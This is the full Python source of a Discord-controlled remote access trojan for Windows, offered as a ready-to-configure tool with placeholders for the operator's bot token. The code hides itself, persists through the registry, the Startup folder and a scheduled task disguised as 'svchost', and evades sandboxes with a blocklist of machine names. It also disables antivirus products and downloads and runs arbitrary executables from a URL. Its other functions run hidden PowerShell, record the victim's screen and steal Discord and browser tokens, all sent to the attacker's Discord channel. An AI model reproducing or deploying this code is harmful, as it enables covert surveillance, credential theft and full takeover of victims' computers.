import discord
from discord.ext import commands
import os
import pyautogui
import requests
import subprocess
import sys
import ctypes
import shutil
import winreg
import socket
import platform
import psutil
import time
import threading
import tkinter as tk
import asyncio
import webbrowser
import GPUtil
import cv2
import numpy as np
import getpass
import tkinter as tk




shine = "PUT_YOUR_DISCORD_TOKEN HERE"
GUILD_ID = PUT_YOUR_GUILD_ID_HERE
ALLOWED_CHANNELS = {}
PC_CHANNELS = {}
LAST_EMBED_MESSAGE_ID = None

# Hide the console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

# Blacklist for PC names
BLACKLISTED_PC_NAMES = ["john-pc", "wasp", "Abby", "WDAGUtilityAccount", "DESKTOP-ET51AJO", "KBKWGEBK", "DESKTOP-B0T93D6", "george", "00900BC83803S"]

@bot.event
async def on_ready():
    print(f'Bot is connected as {bot.user}')
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)

    pc_name = os.environ['COMPUTERNAME']
    
    # Check if PC name is blacklisted
    if pc_name in BLACKLISTED_PC_NAMES:
        print(f"PC '{pc_name}' is blacklisted. Session creation skipped.")
        return  # Exit function if blacklisted

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def hide_file(file_path):
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02)  # 0x02 is the hidden attribute

# Hide the console window
hide_console()

# Hide the current script file
if __name__ == "__main__":
    current_script_path = os.path.realpath(sys.argv[0])
    hide_file(current_script_path)
    print(f"Script is now hidden: {current_script_path}")

# Retrieve AppData Path
appdata_path = os.getenv("APPDATA")
script_name = os.path.basename(__file__)
script_path = os.path.join(appdata_path, script_name)


def add_to_startup_methods(script_path):
    # Copy to Startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    try:
        shutil.copy(script_path, startup_folder)
        print(f"Script copied to Startup folder: {startup_folder}")
    except Exception as e:
        print(f"Error copying to Startup folder: {e}")

    # Add to registry for current user (HKCU)
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry_key, "svchost", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(registry_key)
        print("Added to HKCU Run registry")
    except Exception as e:
        print(f"Error adding to HKCU registry: {e}")

    # Attempt to add to registry for all users (HKLM)
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry_key, "svchost", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(registry_key)
        print("Added to HKLM Run registry (Admin)")
    except PermissionError:
        print("Permission denied: Unable to add to HKLM registry. Admin privileges required.")
    except Exception as e:
        print(f"Error adding to HKLM registry: {e}")

    # Create a scheduled task for startup with highest privileges
    task_name = "svchost"
    try:
        command = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /rl highest /f'
        subprocess.call(command, shell=True)
        print(f"Scheduled task '{task_name}' created.")
    except Exception as e:
        print(f"Error creating scheduled task: {e}")

def add_startup_entries():
    # Determine the script's current path
    script_path = os.path.realpath(sys.argv[0])
    
    # If the script isn't already in the AppData directory, copy it there
    appdata_path = os.getenv("APPDATA")
    target_path = os.path.join(appdata_path, os.path.basename(script_path))
    
    if not os.path.exists(target_path):
        shutil.copy(script_path, target_path)
        print(f"Copied {script_path} to {target_path}")
    
    # Hide the script in the target location
    subprocess.call(f'attrib +h "{target_path}"', shell=True)

    # Add to startup methods
    add_to_startup_methods(target_path)

# Call to add startup entries
add_startup_entries()

# Call to add startup entries
if __name__ == "__main__":
    add_startup_entries()
    
def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        ip_address = data.get('ip')
        country_code = data.get('country')
        return ip_address, country_code
    except Exception as e:
        return None, None

# Function to get PC information
def get_pc_info():
    cpu = platform.processor()
    ram = round(psutil.virtual_memory().total / (1024 ** 3))
    return f"CPU: {cpu}\nRAM: {ram} GB"

# Country flags dictionary
country_flags = {
    'US': '🇺🇸',
    'CA': '🇨🇦',
    'GB': '🇬🇧',
    'DE': '🇩🇪',
    'FR': '🇫🇷',
    'IT': '🇮🇹',
    'JP': '🇯🇵',
    'IN': '🇮🇳',
    'AR': '🇦🇷',
    'AU': '🇦🇺',
    'CN': '🇨🇳',
    'CZ': '🇨🇿',
    'DK': '🇩🇰',
}

@bot.check
async def check_channel(ctx):
    allowed_channel_id = ALLOWED_CHANNELS.get(ctx.guild.id)
    return allowed_channel_id is None or ctx.channel.id == allowed_channel_id

@bot.event
async def on_ready():
    print(f'Bot is connected as {bot.user}')
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)

    pc_name = os.environ['COMPUTERNAME']
    ip_address, country_code = get_ip_info()
    country_flag = country_flags.get(country_code, '') if country_code else '🏳️'  # Default to a white flag if no code

    # Get GPU information
    gpus = GPUtil.getGPUs()
    gpu_info = ""
    if gpus:
        for gpu in gpus:
            gpu_info += f"**{gpu.name}** - Memory: {gpu.memoryTotal}MB (Free: {gpu.memoryFree}MB, Used: {gpu.memoryUsed}MB)\n"
    else:
        gpu_info = "No GPU found."

    if pc_name not in PC_CHANNELS:
        # Create a new text channel for the PC if it doesn't already exist
        channel = await guild.create_text_channel(name=f'session-{pc_name}')
        PC_CHANNELS[pc_name] = channel.id
        ALLOWED_CHANNELS[guild.id] = channel.id

        # Capture a screenshot
        screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        # Create the embed message with PC details
        embed = discord.Embed(color=11075803)
        embed.add_field(name="🖥️ PC-NAME", value=pc_name, inline=False)
        embed.add_field(name="ℹ️ PC INFO", value=get_pc_info(), inline=False)
        embed.add_field(name="🌐 IP", value=ip_address, inline=False)
        embed.add_field(name="🌍 COUNTRY", value=f"{country_flag} {country_code}", inline=False)
        embed.add_field(name="🎮 GPU INFO", value=gpu_info, inline=False)
        embed.set_image(url="attachment://screenshot.png")  # Set the image inside the embed

        # Send the embed and screenshot to the new channel
        message = await channel.send(embed=embed, file=discord.File(screenshot_path, 'screenshot.png'))

        # Store the ID of the embed message
        global LAST_EMBED_MESSAGE_ID
        LAST_EMBED_MESSAGE_ID = message.id

        # Notify users of the new session
        await channel.send("@here A new session has been created for PC: " + pc_name)
    else:
        ALLOWED_CHANNELS[guild.id] = PC_CHANNELS[pc_name]


@bot.command()
async def ss(ctx):
    print("Screenshot command received!")
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
    screenshot.save(screenshot_path)

    embed = discord.Embed(title="Screenshot", color=0xa900db)
    embed.set_image(url="attachment://screenshot.png")  # Set the image inside the embed

    with open(screenshot_path, 'rb') as f:
        await ctx.send(embed=embed, file=discord.File(f, 'screenshot.png'))

@bot.command()
async def clear(ctx, amount: int = 100):
    print("Clear command received!")
    if LAST_EMBED_MESSAGE_ID is not None:
        def check(msg):
            return msg.id != LAST_EMBED_MESSAGE_ID and msg.channel == ctx.channel

        deleted = await ctx.channel.purge(limit=amount, check=check)
        await ctx.send(f"Deleted {len(deleted)} messages.", delete_after=5)

@bot.command()
async def execute(ctx, url: str):
    print("Execute command received!")
    temp_path = os.path.join(os.getenv('TEMP'), 'bound.exe')

    # Check if the file already exists and delete it
    if os.path.exists(temp_path):
        os.remove(temp_path)
        print("Old downloaded file deleted.")

    # Download the new file
    try:
        response = requests.get(url, allow_redirects=True)
        response.raise_for_status()  # Raise an error for bad responses

        with open(temp_path, 'wb') as f:
            f.write(response.content)
            print("New file downloaded.")

        # Set file attributes to hide it
        ctypes.windll.kernel32.SetFileAttributesW(temp_path, 2)
        
        # Execute the downloaded file
        subprocess.Popen(temp_path, shell=True)
        
        # Send feedback to the Discord channel
        await ctx.send(f"Downloaded and executed: {temp_path}")
    except Exception as e:
        print(f"An error occurred: {e}")
        await ctx.send(f"Failed to download or execute the file: {e}")
    

@bot.command()
async def admin(ctx):
    print("Admin command received!")
    
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("Restarting with admin privileges...")
        try:
            # Restart the bot with admin privileges
            ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable,  # Path to the Python interpreter
                " ".join(sys.argv),  # Arguments to the script
                None, 
                1  # Show the command window
            )
        except Exception as e:
            await ctx.send(f"Failed to restart with admin privileges: {str(e)}")
    else:
        await ctx.send("Already running as admin.")

@bot.command()
async def av(ctx):
    print("Attempting to disable antivirus software...")

    # Check if the bot is running with admin privileges
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("Please run this command with admin privileges.")
        return

    try:
        # Disable Windows Defender
        await ctx.send("Disabling Windows Defender...")
        subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name WinDefend -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Windows Defender Real-Time Protection Disabled.")

        # Disable Bitdefender
        await ctx.send("Disabling Bitdefender...")
        subprocess.run(['powershell', '-Command', "Stop-Service -Name 'Bitdefender Endpoint Security' -Force"], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', "Stop-Service -Name 'Bitdefender Threat Scanner' -Force"], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', "Stop-Service -Name 'Bitdefender Active Virus Control' -Force"], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', "Stop-Service -Name 'Bitdefender Device Management Service' -Force"], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', "Set-Service -Name 'Bitdefender Endpoint Security' -StartupType Disabled"], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Bitdefender Disabled.")

        # Disable Malwarebytes
        await ctx.send("Disabling Malwarebytes...")
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name MBAMService -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name MBAMScheduler -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Malwarebytes Disabled.")

        # Disable Avast
        await ctx.send("Disabling Avast...")
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name AvastSvc -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name AvastFirewall -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name AvastWebShield -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name AvastMailShield -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-Service -Name AvastSvc -StartupType Disabled'], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Avast Disabled.")

        # Disable Norton
        await ctx.send("Disabling Norton Antivirus...")
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name "Norton AntiVirus" -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name "Norton Security" -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name "Norton Firewall" -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-Service -Name "Norton AntiVirus" -StartupType Disabled'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-Service -Name "Norton Security" -StartupType Disabled'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-Service -Name "Norton Firewall" -StartupType Disabled'], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Norton Antivirus Disabled.")

    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")


@bot.command()
async def clients(ctx):
    print("Clients command received!")
    await ctx.send("Connected clients: " + ', '.join(PC_CHANNELS.keys()))

@bot.command()
async def rename(ctx, new_name: str):
    try:
        # Get the current script path
        current_script = sys.argv[0]

        # Determine if the current script is an .exe or .py
        is_executable = current_script.lower().endswith('.exe')
        
        # Ensure the new name has the correct extension
        if is_executable:
            if not new_name.endswith(".exe"):
                new_name += ".exe"
        else:
            if not new_name.endswith(".py"):
                new_name += ".py"
        
        # Define the new file path with the desired name
        new_file_path = os.path.join(os.path.dirname(current_script), new_name)
        
        # Copy the current script to the new file path
        shutil.copy2(current_script, new_file_path)
        
        # Start the renamed script as a new process
        if is_executable:
            subprocess.Popen([new_file_path] + sys.argv[1:])  # Start the new .exe
        else:
            subprocess.Popen([sys.executable, new_file_path] + sys.argv[1:])  # Start the new .py

        # Inform the user about the rename and restart
        await ctx.send(f"Bot is restarting with the new name: `{new_name}`")
        
        # Exit the current process to complete the restart
        await bot.close()
        sys.exit()

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def commands(ctx):
    print("Help command received!")
    embed = discord.Embed(title="Help", color=0xa900db)
    embed.add_field(name="📷 .ss", value="Take a screenshot and send it.", inline=False)
    embed.add_field(name="🔌 .disconnect", value="Disconnect from the current PC session.", inline=False)
    embed.add_field(name="🗑️ .clear [amount]", value="Clear the last [amount] messages in the channel.", inline=False)
    embed.add_field(name="💻 .execute [url]", value="Download and execute a file from a given URL.", inline=False)
    embed.add_field(name="🔑 .admin", value="Restart the bot with admin privileges.", inline=False)
    embed.add_field(name="🛡️ .av", value="Disable Windows Defender and other antivirus software.", inline=False)
    embed.add_field(name="👥 .clients", value="Show connected clients.", inline=False)
    embed.add_field(name="🔒 .shutdown", value="Shutdown the PC.", inline=False)
    embed.add_field(name="🔄 .restart", value="Restart the PC.", inline=False)
    embed.add_field(name="❄️ .rename", value="Rename the Process.", inline=False)
    embed.add_field(name="🌐 .website", value="Redirect to a website.", inline=False)
    embed.add_field(name="▶️ .sr", value="Start screen recording", inline=False)
    embed.add_field(name="💌 .powershell [command]", value="command powershell.", inline=False)
    embed.add_field(name="📂 .directory", value="shows where its directory is.", inline=False)
    embed.add_field(name="🔥 .token, value", value="Get the Token🤑", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def disconnect(ctx):
    print("Disconnect command received! Removing the bot from this PC/session...")
    pc_name = os.environ['COMPUTERNAME']

    if pc_name in PC_CHANNELS:
        channel_id = PC_CHANNELS[pc_name]
        channel = bot.get_channel(channel_id)

        # Notify users in the channel about the disconnection
        await channel.send(f"Disconnecting from PC: {pc_name}. This session will be removed.")
        
        # Delete the channel
        await channel.delete()
        
        # Remove the PC from the active channels
        del PC_CHANNELS[pc_name]
        del ALLOWED_CHANNELS[ctx.guild.id]
        
        # Notify that the disconnection was successful
        await ctx.send(f"Disconnected from PC: {pc_name}. Channel and session removed.")

    else:
        await ctx.send("This PC is not connected or no session found.")
    
    # Log out the bot if it has no remaining sessions
    if not PC_CHANNELS:
        await bot.logout()
        os._exit(0)  # Forcefully terminate the script if no active sessions remain

@bot.command()
async def shutdown(ctx):
    print("Shutdown command received!")
    await ctx.send("Shutting down the PC...")
    os.system("shutdown /s /t 1")

@bot.command()
async def restart(ctx):
    print("Restart command received!")
    await ctx.send("Restarting the PC...")
    os.system("shutdown /r /t 1")

@bot.command()
async def website(ctx, url: str):
    print(f"Opening website: {url}")
    webbrowser.open(url)
    await ctx.send(f"Opening website: {url}")

@bot.command()
async def sr(ctx, duration: int = 30):  # Default duration is set to 30 seconds
    # Input validation
    if duration <= 0:
        await ctx.send("Duration must be a positive integer.")
        return

    await ctx.send(f"Starting screen recording for {duration} seconds...")

    # Fixed parameters
    frame_rate = 20.0
    screen_size = pyautogui.size()

    # Define video writer for recording in mov format
    video_path = os.path.join(os.getenv('TEMP'), 'screen_record.mov')  # Change to .mov
    fourcc = cv2.VideoWriter_fourcc(*"mov")  # MOV codec
    out = cv2.VideoWriter(video_path, fourcc, frame_rate, screen_size)

    # Start recording the screen
    start_time = time.time()
    while time.time() - start_time < duration:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    # Release the video writer
    out.release()

    # Send feedback that recording has finished
    await ctx.send("Screen recording finished. Sending the video...")

    # Send the video file to the Discord channel
    with open(video_path, 'rb') as f:
        await ctx.send("Here is the screen recording:", file=discord.File(f, 'screen_record.mov'))

    # Optionally, delete the video file after sending
    os.remove(video_path)

def find_tokens():
    tokens = []
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
        'Lightcord': roaming + "\\Lightcord",
        'Opera GX': roaming + "\\Opera Software\\Opera GX Stable",
        # Add any other browsers or platforms as needed
    }

    for platform, path in paths.items():
        path = os.path.join(path, "Local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if f"{token} | {platform}" not in tokens:
                                        tokens.append(f"{token} | {platform}")
    return tokens

@bot.command(name="find_tokens")
async def find_tokens_command(ctx):
    tokens = find_tokens()
    if tokens:
        tokens_message = "\n".join(tokens)
        await ctx.send(f"Tokens found:\n```{tokens_message}```")
    else:
        await ctx.send("No tokens found.")


@bot.command()
async def powershell(ctx, *, command: str):
    # Construct the PowerShell command to execute in the background
    ps_command = f"$ErrorActionPreference = 'Stop'; {command}"
    
    # Run PowerShell in hidden mode
    process = subprocess.Popen(
        ["powershell", "-Command", ps_command],
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    # Wait for a moment to let the command execute (adjust as necessary)
    time.sleep(2)

    # Check for errors and output
    stdout, stderr = process.communicate()
    if stderr:
        await ctx.send(f"Error:\n```\n{stderr.strip()}\n```")
    else:
        await ctx.send(f"Output:\n```\n{stdout.strip()}\n```")

@bot.command()
async def directory(ctx):
    current_directory = os.getcwd()  # Get the current working directory
    await ctx.send(f"The current directory is: {current_directory}")

add_startup_entries()

if __name__ == "__main__":
    # Check if the script is run as a standalone .exe or as a .py script
    if getattr(sys, 'frozen', False):  # If the script is bundled as an executable
        script_name = sys.executable  # Get the name of the executable
    else:
        script_name = sys.argv[0]  # Get the name of the script

bot.run(shine)
